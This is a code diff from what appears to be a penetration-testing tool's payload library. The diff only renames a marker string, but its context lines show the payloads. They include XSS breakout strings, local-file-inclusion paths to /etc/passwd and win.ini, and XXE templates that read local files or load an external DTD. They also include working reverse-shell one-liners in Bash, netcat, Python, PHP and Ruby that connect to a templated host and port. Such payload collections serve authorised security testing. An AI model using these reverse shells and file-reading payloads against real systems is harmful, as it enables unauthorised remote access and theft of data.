@@ -16,7 +16,7 @@ group('XSS', 'Context checks', [
   ['Textarea breakout', '</textarea><svg onload=alert(1)>'], ['Title breakout', '</title><svg onload=alert(1)>'],
   ['Single quote JS breakout', "';alert(1);//"], ['Double quote JS breakout', '";alert(1);//'],
   ['Template literal check', '${alert(1)}'], ['JavaScript URL', 'javascript:alert(1)'],
-  ['HTML marker', '<hacktab-probe>marker</hacktab-probe>']
+  ['HTML marker', '<hack-devtools-probe>marker</hack-devtools-probe>']
 ]);
 group('LFI', 'Paths', [
   ['Unix passwd', '/etc/passwd'], ['Unix hosts', '/etc/hosts'], ['Windows INI', 'C:\\Windows\\win.ini'],
@@ -37,7 +37,7 @@ group('LFI', 'Wrappers / process / logs', [
   ['XAMPP configuration', 'C:\\xampp\\apache\\conf\\httpd.conf']
 ]);
 group('XXE', 'XML templates', [
-  ['Internal entity probe', '<?xml version="1.0"?>\n<!DOCTYPE probe [<!ENTITY marker "HackTab">]>\n<probe>&marker;</probe>'],
+  ['Internal entity probe', '<?xml version="1.0"?>\n<!DOCTYPE probe [<!ENTITY marker "Hack-DevTools">]>\n<probe>&marker;</probe>'],
   ['External file entity', '<?xml version="1.0"?>\n<!DOCTYPE probe [<!ENTITY file SYSTEM "file://{{file}}">]>\n<probe>&file;</probe>'],
   ['PHP base64 entity', '<?xml version="1.0"?>\n<!DOCTYPE probe [<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource={{file}}">]>\n<probe>&file;</probe>'],
   ['External DTD template', '<?xml version="1.0"?>\n<!DOCTYPE probe SYSTEM "http://{{host}}:{{port}}/probe.dtd">\n<probe>marker</probe>'],
@@ -46,7 +46,7 @@ group('XXE', 'XML templates', [
 group('Shells', 'Reverse shell templates', [
   ['Bash TCP', "bash -c 'bash -i >& /dev/tcp/{{host}}/{{port}} 0>&1'"],
   ['Netcat exec', 'nc {{host}} {{port}} -e /bin/sh'],
-  ['Netcat FIFO', 'mkfifo /tmp/hacktab-pipe; /bin/sh -i < /tmp/hacktab-pipe 2>&1 | nc {{host}} {{port}} > /tmp/hacktab-pipe'],
+  ['Netcat FIFO', 'mkfifo /tmp/hack-devtools-pipe; /bin/sh -i < /tmp/hack-devtools-pipe 2>&1 | nc {{host}} {{port}} > /tmp/hack-devtools-pipe'],
   ['Python 3', "python3 -c 'import os,socket,subprocess;s=socket.socket();s.connect((\"{{host}}\",{{port}}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'"],
   ['PHP socket', "php -r '$s=fsockopen(\"{{host}}\",{{port}});$p=proc_open(\"/bin/sh\",array(0=>$s,1=>$s,2=>$s),$pipes);'"],
   ['Ruby socket', "ruby -rsocket -e 's=TCPSocket.new(\"{{host}}\",{{port}});exec \"/bin/sh -i\",in:s,out:s,err:s'"],
